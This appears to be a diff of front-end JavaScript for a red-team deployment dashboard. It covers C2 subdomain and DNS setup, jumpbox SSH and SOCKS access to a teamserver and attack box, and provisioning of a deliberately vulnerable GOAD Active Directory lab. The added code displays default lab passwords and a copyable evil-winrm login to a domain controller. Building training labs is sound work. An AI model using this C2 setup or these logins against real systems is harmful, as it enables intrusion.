+                    `<div style="padding: 6px 10px; background: var(--bg-terminal); border-radius: 4px; margin-bottom: 4px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.92em; color: var(--text-terminal);">${ns}</div>`
+                ).join('');
+                const nsPlainText = outputs.dns_nameservers.join('\\n');
+                const escapedNsText = nsPlainText.replace(/'/g, "\\'");
+
+                html += `
+                    <div style="margin-bottom: 15px; padding: 15px; background: var(--info-bg); border-radius: 8px; border-left: 4px solid var(--info);">
+                        <div style="font-weight: 600; color: var(--info-text); margin-bottom: 10px; font-size: 1.05em; display: flex; align-items: center; justify-content: space-between;">
+                            <span>🌐 DNS Nameservers</span>
+                            <button onclick="copyToClipboard('${escapedNsText}', this)"
+                                    style="background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-light); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.7em; font-weight: 400;">
+                                📋 Copy All
+                            </button>
+                        </div>
+                        <div style="margin-bottom: 10px; font-size: 0.9em; color: var(--text-primary); line-height: 1.5;">
+                            <strong>Domain:</strong> <code class="code-inline">${outputs.dns_domain || ''}</code>
+                        </div>
+                        <div style="margin-bottom: 12px;">
+                            ${nsListHtml}
+                        </div>
+                        <div style="padding: 10px; background: var(--warning-bg); border-radius: 6px; border: 1px solid var(--warning-border);">
+                            <div style="font-weight: 500; color: var(--warning-text); margin-bottom: 6px; font-size: 0.9em;">⚠️ Required: Update Your Domain Registrar</div>
+                            <div style="font-size: 0.88em; color: var(--text-primary); line-height: 1.5;">
+                                Copy these 4 nameservers and set them as the <strong>custom nameservers</strong> at your domain registrar
+                                (e.g., Namecheap, GoDaddy, Cloudflare). DNS propagation can take up to 48 hours.
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+
             // Internal Access Info (from Jumpbox) - show if teamserver or attackbox exists
             if (outputs.teamserver_private_ip || outputs.attackbox_private_ip) {
                 html += `
                     <div style="padding: 15px; background: var(--bg-section); border-radius: 8px; margin-top: 10px; border: 1px solid var(--border-light);">
-                        <div style="font-weight: 600; margin-bottom: 10px; color: var(--accent-muted);">🔗 Internal Access (from Jumpbox)</div>
+                        <div style="font-weight: 600; margin-bottom: 10px; color: var(--text-primary);">🔗 Internal Access (from Jumpbox)</div>
                         <div style="font-size: 0.9em; color: var(--text-primary); margin-bottom: 12px;">
                             Once connected to the jumpbox, you can access internal hosts using the pre-configured SSH aliases:
                         </div>
-                        <div style="background: var(--bg-terminal); border-radius: 6px; padding: 12px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.9em;">
-                            ${outputs.teamserver_private_ip ? `<div style="color: var(--accent-muted); margin-bottom: 6px;"><span style="color: var(--text-muted);"># SSH to Team Server</span></div><div style="color: var(--accent-muted); margin-bottom: 10px;">ssh teamserver</div>` : ''}
-                            ${outputs.attackbox_private_ip ? `<div style="color: var(--accent-muted); margin-bottom: 6px;"><span style="color: var(--text-muted);"># SSH to Attack Box</span></div><div style="color: var(--accent-muted); margin-bottom: 10px;">ssh attackbox</div>` : ''}
-                            <div style="color: var(--accent-muted); margin-bottom: 6px;"><span style="color: var(--text-muted);"># SSH to Windows DC (by IP)</span></div>
-                            <div style="color: var(--accent-muted);">ssh 192.168.56.10</div>
+                        <div class="terminal-block" style="font-size: 0.9em;">
+                            ${outputs.teamserver_private_ip ? `<div style="color: var(--text-terminal); margin-bottom: 6px;"><span class="t-muted"># SSH to Team Server</span></div><div style="color: var(--text-terminal); margin-bottom: 10px;">ssh teamserver</div>` : ''}
+                            ${outputs.attackbox_private_ip ? `<div style="color: var(--text-terminal); margin-bottom: 6px;"><span class="t-muted"># SSH to Attack Box</span></div><div style="color: var(--text-terminal); margin-bottom: 10px;">ssh attackbox</div>` : ''}
+                            <div style="color: var(--text-terminal); margin-bottom: 6px;"><span class="t-muted"># SSH to Windows DC (by IP)</span></div>
+                            <div class="t-terminal">ssh 192.168.56.10</div>
                         </div>
                         <div style="margin-top: 10px; font-size: 0.88em; color: var(--info-text);">
                             💡 The jumpbox has pre-configured SSH keys for internal access. No additional keys needed.
@@ -5371,12 +11269,23 @@ async function loadConnectionInfo(projectName, sessionId) {
             html += '</div>';
             contentDiv.innerHTML = html;
     } catch (error) {
-        contentDiv.innerHTML = `<div style="color: var(--danger-text);">Error loading connection info: ${error.message}</div>`;
+        contentDiv.innerHTML = `<div class="t-danger">Error loading connection info: ${error.message}</div>`;
     }
 }
 
 // Make loadConnectionInfo available globally for onclick handlers
 window.loadConnectionInfo = loadConnectionInfo;
+
+async function loadPostDeployChecklist(projectName, sessionId) {
+    const contentDiv = document.getElementById(`${sessionId}-checklist-content`);
+    if (!contentDiv) return;
+    const text = contentDiv.textContent.trim();
+    if (text !== 'Loading checklist...' && text !== '') return;
+    const projectData = await loadProjectData(projectName);
+    const html = buildPostDeployChecklist(sessionId, projectData);
+    contentDiv.innerHTML = html || '<div class="t-secondary">No checklist data available.</div>';
+}
+window.loadPostDeployChecklist = loadPostDeployChecklist;
 
 /**
  * Copy text to clipboard
@@ -5485,10 +11394,10 @@ async function startGoadProvisioning(sessionId) {
             addDeploymentLog(`AD provisioning started for ${labName} on jumpbox ${data.jumpbox_ip} (PID: ${data.remote_pid})`, 'info');
             msgSpan.textContent = `AD provisioning running on jumpbox (${data.jumpbox_ip})`;
             logDiv.innerHTML = `
-                <div style="color: var(--accent-muted);">Remote PID: ${data.remote_pid}</div>
-                <div style="color: var(--text-muted);">Estimated time: ${data.estimated_time}</div>
-                <div style="color: var(--text-muted);">Log file: ${data.log_file}</div>
-                <div style="color: var(--text-muted); margin-top: 8px;">Monitor progress: <span style="color: var(--accent-muted);">${data.monitor_cmd}</span></div>
+                <div class="t-terminal">Remote PID: ${data.remote_pid}</div>
+                <div class="t-muted">Estimated time: ${data.estimated_time}</div>
+                <div class="t-muted">Log file: ${data.log_file}</div>
+                <div style="color: var(--text-muted); margin-top: 8px;">Monitor progress: <span class="t-terminal">${data.monitor_cmd}</span></div>
             `;
             btn.textContent = '⏳ Provisioning In Progress...';
 
@@ -5498,9 +11407,9 @@ async function startGoadProvisioning(sessionId) {
             addDeploymentLog(`AD provisioning failed to start: ${data.error || 'Unknown error'}`, 'error');
             msgSpan.style.color = 'var(--danger-text)';
             msgSpan.textContent = 'Provisioning failed to start';
-            logDiv.innerHTML = `<div style="color: var(--danger-text);">${data.error || 'Unknown error'}</div>`;
+            logDiv.innerHTML = `<div class="t-terminal">${data.error || 'Unknown error'}</div>`;
             if (data.hint) {
-                logDiv.innerHTML += `<div style="color: var(--warning-text); margin-top: 5px;">${data.hint}</div>`;
+                logDiv.innerHTML += `<div style="color: #E8C56D; margin-top: 5px;">${data.hint}</div>`;
             }
             btn.textContent = '🚀 Retry Provisioning';
             btn.disabled = false;
@@ -5508,9 +11417,9 @@ async function startGoadProvisioning(sessionId) {
         }
     } catch (err) {
         addDeploymentLog(`AD provisioning error: ${err.message}`, 'error');
-        msgSpan.style.color = 'var(--danger-text)';
+        msgSpan.style.color = '#F08A84';
         msgSpan.textContent = 'Error connecting to API';
-        logDiv.innerHTML = `<div style="color: var(--danger-text);">${err.message}</div>`;
+        logDiv.innerHTML = `<div class="t-terminal">${err.message}</div>`;
         btn.textContent = '🚀 Retry Provisioning';
         btn.disabled = false;
         btn.style.opacity = '1';
@@ -5553,11 +11462,11 @@ async function pollProvisionStatus(sessionId) {
                     msgSpan.textContent = 'AD provisioning failed';
                 }
                 if (logDiv) {
-                    logDiv.innerHTML += `<div style="color: var(--danger-text); margin-top: 8px;">Exit code: ${exitCode}${error ? ' - ' + error : ''}</div>
-                        <div style="color: var(--warning-text); margin-top: 4px;">Check log: ssh ubuntu@${data.data?.jumpbox_ip || 'JUMPBOX'} cat /home/ubuntu/goad-provision.log</div>`;
+                    logDiv.innerHTML += `<div style="color: var(--text-terminal); margin-top: 8px;">Exit code: ${exitCode}${error ? ' - ' + error : ''}</div>
+                        <div style="color: #E8C56D; margin-top: 4px;">Check log: ssh ubuntu@${data.data?.jumpbox_ip || 'JUMPBOX'} cat /home/ubuntu/goad-provision.log</div>`;
                     if (logTail) {
-                        logDiv.innerHTML += `<div style="margin-top: 8px; color: var(--text-muted); font-size: 0.88em;">Last log output:</div>
-                            <pre style="color: var(--danger-text); white-space: pre-wrap; margin: 4px 0;">${logTail}</pre>`;
+                        logDiv.innerHTML += `<div style="margin-top: 8px; color: #7A849E; font-size: 0.88em;">Last log output:</div>
+                            <pre style="color: var(--text-terminal); white-space: pre-wrap; margin: 4px 0;">${logTail}</pre>`;
                     }
                 }
                 if (btn) {
@@ -5577,7 +11486,7 @@ async function pollProvisionStatus(sessionId) {
                 existingLogTail.textContent = data.log_tail;
             } else {
                 logDiv.innerHTML += `<div style="margin-top: 8px; color: var(--text-muted); font-size: 0.88em;">Ansible Log (last 20 lines):</div>
-                    <pre class="provision-log-tail" style="color: var(--accent-muted); white-space: pre-wrap; margin: 4px 0; max-height: 200px; overflow-y: auto;">${data.log_tail}</pre>`;
+                    <pre class="provision-log-tail" style="color: var(--text-terminal); white-space: pre-wrap; margin: 4px 0; max-height: 200px; overflow-y: auto;">${data.log_tail}</pre>`;
             }
         }
 
@@ -5601,18 +11510,22 @@ window.verifyGoadAD = verifyGoadAD;
  */
 async function loadCredentials(projectName, sessionId) {
     if (!projectName) return;
-    
+
     const contentDiv = document.getElementById(`${sessionId}-credentials-content`);
     if (!contentDiv) return;
+
+    // Skip if already loaded
+    const text = contentDiv.textContent.trim();
+    if (text !== 'Loading credentials...' && text !== '') return;
     
     contentDiv.innerHTML = '<div class="spinner" style="margin: 10px auto;"></div> Loading credentials...';
-    
+
     try {
-        const response = await fetch(`${API_BASE}/goad/credentials`);
+        const response = await fetch(`${API_BASE}/goad/credentials?project=${encodeURIComponent(projectName)}`);
         const data = await response.json();
-        
+
         let creds;
-        
+
         if (data.success && data.credentials) {
             creds = data.credentials;
         } else {
@@ -5637,7 +11550,7 @@ async function loadCredentials(projectName, sessionId) {
             html += `
                 <div style="margin-bottom: 15px; padding: 12px; background: var(--warning-bg); border-radius: 6px; border-left: 4px solid var(--warning);">
                     <div style="font-weight: 600; color: var(--warning-text); margin-bottom: 8px;">🔐 Default Password</div>
-                    <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 10px 14px; border-radius: 4px; display: inline-block; font-size: 1.2em; font-family: 'SF Mono', Monaco, Consolas, monospace;">${creds.default_password}</code>
+                    <code style="background: var(--bg-terminal); color: var(--text-terminal); padding: 10px 14px; border-radius: 4px; display: inline-block; font-size: 1.2em; font-family: 'SF Mono', Monaco, Consolas, monospace;">${creds.default_password}</code>
                     <div style="margin-top: 8px; font-size: 0.88em; color: var(--text-secondary);">Used for most AD accounts unless specified otherwise</div>
                 </div>
             `;
@@ -5708,9 +11621,9 @@ async function loadCredentials(projectName, sessionId) {
         if (creds.trusts && creds.trusts.length > 0) {
             html += `
                 <div style="margin-bottom: 15px; padding: 12px; background: var(--bg-section); border-radius: 6px; border-left: 4px solid var(--brand);">
-                    <div style="font-weight: 600; color: var(--accent-muted); margin-bottom: 8px;">🔗 Domain Trusts</div>
+                    <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 8px;">🔗 Domain Trusts</div>
                     <div style="font-size: 0.95em;">
-                        ${creds.trusts.map(t => `<div style="margin-bottom: 4px;">${t.from} → ${t.to} <span style="color: var(--text-muted);">(${t.type})</span></div>`).join('')}
+                        ${creds.trusts.map(t => `<div style="margin-bottom: 4px;">${t.from} → ${t.to} <span class="t-muted">(${t.type})</span></div>`).join('')}
                     </div>
                 </div>
             `;
@@ -5829,6 +11742,71 @@ function getDefaultGoadCredentials(projectName) {
 // ============================================================================
 // AWS CHECK FUNCTIONS
 // ============================================================================
+
+/**
+ * Check all system dependencies
+ */
+async function checkSystemDeps() {
+    const container = document.getElementById('system-deps-status');
+    if (!container) return;
+
+    container.innerHTML = '<div class="spinner"></div> Checking system dependencies...';
+
+    try {
+        const resp = await fetch(`${API_BASE}/health/system-deps`);
+        const data = await resp.json();
+
+        if (!data.success) {
+            container.innerHTML = `<div class="callout callout--danger" style="margin: 0;"><p style="margin: 0;">Failed to check dependencies</p></div>`;
+            return;
+        }
+
+        const required = data.deps.filter(d => d.required);
+        const optional = data.deps.filter(d => !d.required);
+        const allRequiredInstalled = required.every(d => d.installed);
+
+        let html = `<table style="width: 100%; border-collapse: collapse; font-size: 0.88em;">`;
+        html += `<thead><tr style="border-bottom: 1px solid var(--border); text-align: left;">
+            <th style="padding: 6px 8px;">Tool</th>
+            <th style="padding: 6px 8px;">Status</th>
+            <th style="padding: 6px 8px;">Version</th>
+            <th style="padding: 6px 8px;">Install</th>
+        </tr></thead><tbody>`;
+
+        const renderRow = (dep) => {
+            const icon = dep.installed ? '<span style="color: var(--success);">Installed</span>' : (dep.required ? '<span style="color: var(--danger);">Missing</span>' : '<span class="t-muted">Not found</span>');
+            const label = dep.required ? dep.name : `${dep.name} <small class="t-muted">(optional)</small>`;
+            const ver = dep.version || '—';
+            const install = dep.installed ? '—' : `<code style="font-size: 0.9em;">${dep.install_cmd}</code>`;
+            return `<tr style="border-bottom: 1px solid var(--border);">
+                <td style="padding: 6px 8px;">${label}</td>
+                <td style="padding: 6px 8px;">${icon}</td>
+                <td style="padding: 6px 8px; color: var(--text-muted);">${ver}</td>
+                <td style="padding: 6px 8px;">${install}</td>
+            </tr>`;
+        };
+
+        required.forEach(d => html += renderRow(d));
+        if (optional.length) {
+            html += `<tr><td colspan="4" style="padding: 8px 8px 4px; color: var(--text-muted); font-size: 0.85em;"><strong>Optional</strong></td></tr>`;
+            optional.forEach(d => html += renderRow(d));
+        }
+
+        html += `</tbody></table>`;
+
+        if (allRequiredInstalled) {
+            html = `<div class="callout callout--success" style="margin: 0 0 12px 0;"><p style="margin: 0;">All required dependencies installed.</p></div>` + html;
+        } else {
+            const missing = required.filter(d => !d.installed).map(d => d.name).join(', ');
+            html = `<div class="callout callout--danger" style="margin: 0 0 12px 0;"><p style="margin: 0;"><strong>Missing required:</strong> ${missing}</p></div>` + html;
+        }
+
+        container.innerHTML = html;
+    } catch (e) {
+        container.innerHTML = `<div class="callout callout--danger" style="margin: 0;"><p style="margin: 0;">Error: ${e.message}</p></div>`;
+    }
+}
+
 
 /**
  * Check if Terraform CLI is installed
@@ -5956,10 +11934,124 @@ async function checkAWSCredentials() {
     }
 }
 
+async function checkDomainAvailability() {
+    const statusDiv = document.getElementById('domain-availability-status');
+    if (!statusDiv) return;
+
+    const domain = document.getElementById('primary-domain')?.value;
+    const c2Sub = document.getElementById('c2-subdomain')?.value?.trim() || 'api';
+    const wwwSub = document.getElementById('www-subdomain')?.value?.trim() || 'www';
+    const cdnSub = document.getElementById('cdn-subdomain')?.value?.trim() || 'cdn';
+
+    if (!domain) {
+        statusDiv.innerHTML = '<div class="status-error">Select a domain first</div>';
+        return;
+    }
+
+    const subdomains = [...new Set([c2Sub, wwwSub, cdnSub].filter(Boolean))];
+    statusDiv.innerHTML = '<div class="spinner"></div>Checking Route53 records...';
+
+    try {
+        const resp = await fetch('/api/aws/check-domain', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ domain, subdomains }),
+        });
+        const data = await resp.json();
+
+        if (!data.success) {
+            statusDiv.innerHTML = `<div class="status-error">${data.error}</div>`;
+            return;
+        }
+
+        if (!data.zone_found) {
+            statusDiv.innerHTML = `<div class="status-info" style="margin-top: 8px;">
+                <strong>No Route53 zone found for ${domain}</strong><br>
+                <span class="t-secondary">A hosted zone will be created during deployment. All subdomains will be available.</span>
+            </div>`;
+            return;
+        }
+
+        let html = '<div style="margin-top: 8px;">';
+
+        if (data.has_conflict) {
+            html += `<div class="status-error" style="margin-bottom: 8px;">
+                <strong>⚠️ Subdomain Conflict Detected</strong><br>
+                One or more subdomains already have DNS records. Deploying will <strong>overwrite</strong> them.
+                If these belong to another active deployment, choose different subdomains.
+            </div>`;
+        } else {
+            html += `<div class="status-success" style="margin-bottom: 8px;">
+                <strong>All subdomains available</strong> — no existing DNS records found.
+            </div>`;
+        }
+
+        html += '<table style="width: 100%; font-size: 0.9em; border-collapse: collapse;">';
+        html += '<thead><tr><th style="text-align: left; padding: 4px 8px;">Subdomain</th><th style="text-align: left; padding: 4px 8px;">Status</th><th style="text-align: left; padding: 4px 8px;">Current Records</th></tr></thead><tbody>';
+
+        for (const r of data.results) {
+            const status = r.available
+                ? '<span style="color: var(--success-text);">✓ Available</span>'
+                : '<span style="color: var(--danger-text);">✗ In Use</span>';
+            const records = r.records.map(rec =>
+                `${rec.type}: ${rec.values.join(', ')}`
+            ).join('<br>') || '—';
+
+            html += `<tr>
+                <td style="padding: 4px 8px;"><code>${r.fqdn}</code></td>
+                <td style="padding: 4px 8px;">${status}</td>
+                <td style="padding: 4px 8px; font-size: 0.9em;">${records}</td>
+            </tr>`;
+        }
+
+        html += '</tbody></table></div>';
+        statusDiv.innerHTML = html;
+    } catch (e) {
+        statusDiv.innerHTML = `<div class="status-error">Error: ${e.message}</div>`;
+    }
+}
+
+async function checkSSHKey() {
+    const statusDiv = document.getElementById('ssh-key-status');
+    if (!statusDiv) return;
+
+    statusDiv.className = 'status-display info';
+    statusDiv.innerHTML = '<div class="spinner"></div>Checking for SSH key pair...';
+
+    try {
+        const resp = await fetch('/api/aws/ssh-key');
+        const data = await resp.json();
+
+        if (data.has_key) {
+            statusDiv.className = 'status-display success';
+            statusDiv.innerHTML = `
+                <p><strong>SSH Key Found: ${data.key_type}</strong></p>
+                <div style="margin-top: 8px; padding: 12px; background: var(--bg-card); border-radius: 5px;">
+                    <div><strong>Private:</strong> <code>${data.private_key_path}</code></div>
+                    <div><strong>Public:</strong> <code>${data.public_key_path}</code></div>
+                    ${data.fingerprint ? `<div><strong>Fingerprint:</strong> <code>${data.fingerprint}</code></div>` : ''}
+                </div>
+                <p style="margin-top: 8px;" class="t-muted">${data.note}</p>`;
+        } else {
+            statusDiv.className = 'status-display error';
+            statusDiv.innerHTML = `
+                <p><strong>No SSH Key Found</strong></p>
+                <p>${data.message}</p>
+                <div style="margin-top: 8px; padding: 12px; background: var(--bg-card); border-radius: 5px;">
+                    <strong>Fix:</strong> <code>${data.fix}</code>
+                </div>
+                <p style="margin-top: 8px;" class="t-muted">${data.note}</p>`;
+        }
+    } catch (e) {
+        statusDiv.className = 'status-display error';
+        statusDiv.innerHTML = `<p>Error checking SSH key: ${e.message}</p>`;
+    }
+}
+
 async function checkGitHubCLI() {
     const statusDiv = document.getElementById('github-cli-status');
     if (!statusDiv) return;
-    
+
     statusDiv.innerHTML = '<div class="spinner"></div>Checking GitHub CLI authentication and repo access...';
     statusDiv.className = 'status-display info';
     
@@ -5974,11 +12066,11 @@ async function checkGitHubCLI() {
                 statusDiv.innerHTML = `
                     <p><strong>✅ ${data.message || 'GitHub CLI authenticated with repo access'}</strong></p>
                     <div style="margin-top: 15px; padding: 15px; background: var(--bg-card); border-radius: 5px;">
-                        ${data.username ? `<p><strong>Logged in as:</strong> <code style="background: var(--bg-terminal); padding: 3px 6px; border-radius: 3px;">@${data.username}</code></p>` : ''}
-                        ${data.account_type ? `<p><strong>Auth Type:</strong> <code style="background: var(--bg-terminal); padding: 3px 6px; border-radius: 3px;">${data.account_type}</code></p>` : ''}
-                        <p style="margin-top: 10px;"><strong>✅ Tools Repository Access:</strong> <span style="color: var(--success-text);">Confirmed</span></p>
-                        ${data.repo_visibility ? `<p><strong>Repo Visibility:</strong> <code style="background: var(--bg-terminal); padding: 3px 6px; border-radius: 3px;">${data.repo_visibility}</code></p>` : ''}
-                        <p style="margin-top: 10px;"><a href="${data.tools_repo}" target="_blank" style="color: var(--accent-muted);">${data.tools_repo}</a></p>
+                        ${data.username ? `<p><strong>Logged in as:</strong> <code class="code-inline">@${data.username}</code></p>` : ''}
+                        ${data.account_type ? `<p><strong>Auth Type:</strong> <code class="code-inline">${data.account_type}</code></p>` : ''}
+                        <p style="margin-top: 10px;"><strong>✅ Tools Repository Access:</strong> <span class="t-success">Confirmed</span></p>
+                        ${data.repo_visibility ? `<p><strong>Repo Visibility:</strong> <code class="code-inline">${data.repo_visibility}</code></p>` : ''}
+                        <p style="margin-top: 10px;"><a href="${data.tools_repo}" target="_blank" class="t-terminal">${data.tools_repo}</a></p>
                     </div>
                 `;
             } else {
@@ -5988,18 +12080,18 @@ async function checkGitHubCLI() {
                 statusDiv.innerHTML = `
                     <p><strong>⚠️ GitHub CLI authenticated but NO access to tools repository</strong></p>
                     <div style="margin-top: 15px; padding: 15px; background: var(--bg-card); border-radius: 5px;">
-                        ${data.username ? `<p><strong>Logged in as:</strong> <code style="background: var(--bg-terminal); padding: 3px 6px; border-radius: 3px;">@${data.username}</code></p>` : ''}
-                        <p style="margin-top: 10px;"><strong>❌ Tools Repository Access:</strong> <span style="color: var(--danger-text);">Denied</span></p>
+                        ${data.username ? `<p><strong>Logged in as:</strong> <code class="code-inline">@${data.username}</code></p>` : ''}
+                        <p style="margin-top: 10px;"><strong>❌ Tools Repository Access:</strong> <span class="t-danger">Denied</span></p>
                     </div>
                     <div style="margin-top: 15px; padding: 15px; background: var(--warning-bg); border-radius: 5px; border-left: 4px solid var(--warning);">
                         <p><strong>🔐 Access Required</strong></p>
                         <p style="margin-top: 10px;">The tools repository is private. To get access:</p>
                         <ol style="margin-left: 20px; margin-top: 10px;">
                             <li><strong>Contact Harris</strong> and request access to the repository</li>
-                            <li>Provide your GitHub username: <code style="background: var(--bg-terminal); padding: 3px 6px; border-radius: 3px;">@${data.username || 'your-username'}</code></li>
+                            <li>Provide your GitHub username: <code class="code-inline">@${data.username || 'your-username'}</code></li>
                             <li>Once granted, click "Check GitHub CLI" again to verify</li>
                         </ol>
-                        <p style="margin-top: 15px;"><strong>Repository:</strong> <a href="${data.tools_repo}" target="_blank" style="color: var(--accent-muted);">${data.tools_repo}</a></p>
+                        <p style="margin-top: 15px;"><strong>Repository:</strong> <a href="${data.tools_repo}" target="_blank" class="t-terminal">${data.tools_repo}</a></p>
                     </div>
                 `;
             }
@@ -6013,7 +12105,7 @@ async function checkGitHubCLI() {
                     <p><strong>How to fix:</strong></p>
                     <p>1. Install GitHub CLI: <a href="https://cli.github.com/" target="_blank">https://cli.github.com/</a></p>
                     <p>2. Run: <code style="background: var(--bg-container); padding: 5px;">gh auth login</code></p>
-                    <p style="margin-top: 10px;"><strong>Required for:</strong> Accessing the private tools repository at <a href="${data.tools_repo || 'https://github.com/harr-sudo/red-team-tools'}" target="_blank" style="color: var(--accent-muted);">${data.tools_repo || 'https://github.com/harr-sudo/red-team-tools'}</a></p>
+                    <p style="margin-top: 10px;"><strong>Required for:</strong> Accessing the private tools repository at <a href="${data.tools_repo || 'https://github.com/harr-sudo/red-team-tools'}" target="_blank" class="t-terminal">${data.tools_repo || 'https://github.com/harr-sudo/red-team-tools'}</a></p>
                 </div>
             `;
         }
@@ -6063,7 +12155,7 @@ async function checkAWSPermissions() {
             if (data.missing_permissions && data.missing_permissions.length > 0) {
                 html += '<h4 style="margin-top: 20px; margin-bottom: 10px;">Missing Permissions:</h4><ul style="list-style: none; padding: 0; max-height: 300px; overflow-y: auto;">';
                 data.missing_permissions.slice(0, 30).forEach(perm => {
-                    html += `<li style="padding: 5px; margin-bottom: 5px; background: var(--warning-bg); border-radius: 3px;"><code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${perm}</code></li>`;
+                    html += `<li style="padding: 5px; margin-bottom: 5px; background: var(--warning-bg); border-radius: 3px;"><code class="code-inline">${perm}</code></li>`;
                 });
                 if (data.missing_permissions.length > 30) {
                     html += `<li style="padding: 5px; color: var(--text-secondary); font-style: italic;">... and ${data.missing_permissions.length - 30} more</li>`;
@@ -6229,11 +12321,126 @@ function populateGoadSection(data) {
         <button class="btn btn-danger" onclick="destroyGoadLab()">🗑️ Destroy Lab</button>
     `;
 
+    // Fetch jumpbox info and credentials to show inline
+    populateGoadAccessInfo(section);
+
     // Show provision section and check provisioning status
     const provSection = document.getElementById('goad-provision-section');
     if (provSection) {
         provSection.style.display = 'block';
         checkAndResumeProvisioning();
+    }
+}
+
+/**
+ * Populate GOAD access info (jumpbox SSH + credentials) inline in the GOAD section
+ */
+async function populateGoadAccessInfo(section) {
+    // Find or create the access info container
+    let accessDiv = section.querySelector('#goad-access-info');
+    if (!accessDiv) {
+        accessDiv = document.createElement('div');
+        accessDiv.id = 'goad-access-info';
+        accessDiv.style.marginTop = '15px';
+        // Insert before the provision section
+        const provSection = section.querySelector('#goad-provision-section');
+        if (provSection) {
+            section.insertBefore(accessDiv, provSection);
+        } else {
+            section.appendChild(accessDiv);
+        }
+    }
+
+    try {
+        const [jbResponse, credsResponse] = await Promise.all([
+            fetch(`${API_BASE}/goad/jumpbox`).catch(() => null),
+            fetch(`${API_BASE}/goad/credentials`).catch(() => null)
+        ]);
+
+        let html = '';
+
+        // Jumpbox SSH commands
+        if (jbResponse && jbResponse.ok) {
+            const jbData = await jbResponse.json();
+            if (jbData.success && jbData.jumpbox) {
+                const jb = jbData.jumpbox;
+                if (jb.public_ip) {
+                    const sshCmd = jb.commands?.ssh || `ssh -i ~/.ssh/your_key ubuntu@${jb.public_ip}`;
+                    const socksCmd = jb.commands?.socks_proxy || `ssh -D 1080 -i ~/.ssh/your_key ubuntu@${jb.public_ip}`;
+                    html += `
+                        <div style="background: var(--bg-card); padding: 15px; border-radius: 5px; margin-bottom: 10px;">
+                            <strong>Jumpbox Access</strong>
+                            ${renderCopyableCommand('SSH:', sshCmd)}
+                            ${renderCopyableCommand('SOCKS Proxy (for AD network):', socksCmd)}
+                        </div>`;
+                }
+            }
+        }
+
+        // GOAD credentials
+        if (credsResponse && credsResponse.ok) {
+            const credsData = await credsResponse.json();
+            if (credsData.success && credsData.credentials) {
+                const creds = credsData.credentials;
+                html += `
+                    <details style="margin-top: 10px;">
+                        <summary style="cursor: pointer; color: var(--danger-text); font-weight: 500;">GOAD Default Credentials</summary>
+                        <div style="margin-top: 10px; padding: 15px; background: var(--danger-bg); border-radius: 5px; font-size: 0.9em;">
+                            <p style="margin: 0 0 10px 0; color: var(--danger-text);"><strong>Intentionally Vulnerable:</strong> Default credentials for <strong>${creds.lab_display_name || creds.lab_name}</strong></p>
+                            <div style="background: var(--bg-card); padding: 12px; border-radius: 5px; margin-bottom: 10px;">
+                                ${renderCopyableCommand('Default Password (All Users):', creds.default_password || 'vagrant')}
+                            </div>
+                            ${creds.domain_admins && creds.domain_admins.length > 0 ? `
+                                <p style="margin: 10px 0 8px 0;"><strong>Domain Administrators:</strong></p>
+                                <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
+                                    <thead><tr style="background: var(--bg-container);">
+                                        <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Domain</th>
+                                        <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Username</th>
+                                        <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Password</th>
+                                    </tr></thead>
+                                    <tbody>${creds.domain_admins.map(a => `<tr>
+                                        <td style="padding: 8px; border: 1px solid var(--border);">${a.domain}</td>
+                                        <td style="padding: 8px; border: 1px solid var(--border);"><code>${a.username}</code></td>
+                                        <td style="padding: 8px; border: 1px solid var(--border);"><code class="t-danger">${a.password}</code></td>
+                                    </tr>`).join('')}</tbody>
+                                </table>
+                            ` : ''}
+                            ${creds.key_users && creds.key_users.length > 0 ? `
+                                <p style="margin: 10px 0 8px 0;"><strong>Key Domain Users:</strong></p>
+                                <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
+                                    <thead><tr style="background: var(--warning-bg);">
+                                        <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Domain</th>
+                                        <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Username</th>
+                                        <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Password</th>
+                                        <th style="padding: 8px; text-align: left; border: 1px solid var(--border);">Role</th>
+                                    </tr></thead>
+                                    <tbody>${creds.key_users.map(u => `<tr>
+                                        <td style="padding: 8px; border: 1px solid var(--border);">${u.domain}</td>
+                                        <td style="padding: 8px; border: 1px solid var(--border);"><code>${u.username}</code></td>
+                                        <td style="padding: 8px; border: 1px solid var(--border);"><code class="t-danger">${u.password}</code></td>
+                                        <td style="padding: 8px; border: 1px solid var(--border); font-size: 0.88em;">${u.role}</td>
+                                    </tr>`).join('')}</tbody>
+                                </table>
+                            ` : ''}
+                        </div>
+                    </details>`;
+            }
+        }
+
+        // Common GOAD commands
+        html += `
+            <details style="margin-top: 10px;">
+                <summary style="cursor: pointer; color: var(--info-text); font-weight: 500;">Common GOAD Commands</summary>
+                <div style="margin-top: 10px; padding: 15px; background: var(--bg-container); border-radius: 5px; font-size: 0.9em;">
+                    ${renderCopyableCommand('Check Lab Status:', 'cd /opt/goad && ./goad.sh -t check -l GOAD -p aws')}
+                    ${renderCopyableCommand('Run Ansible Provisioning:', 'cd /opt/goad && ./goad.sh -t install -l GOAD -p aws')}
+                    ${renderCopyableCommand('Test WinRM to DC:', "evil-winrm -i DC_IP -u Administrator -p 'vagrant'")}
+                </div>
+            </details>`;
+
+        accessDiv.innerHTML = html;
+    } catch (e) {
+        console.log('Could not load GOAD access info:', e);
     }
 }
 
@@ -6479,7 +12686,7 @@ function updateGoadProvisioningUI(provData, isRunning, logTail) {
                 <span style="color: var(--text-muted); font-size: 0.88em;">Jumpbox: ${provData.jumpbox_ip || 'unknown'} | PID: ${provData.remote_pid || '?'}</span>
             </div>
             ${logTail ? `
-            <div style="background: var(--bg-terminal); border-radius: 6px; padding: 12px; margin-top: 8px;">
+            <div class="terminal-block" style="margin-top: 8px;">
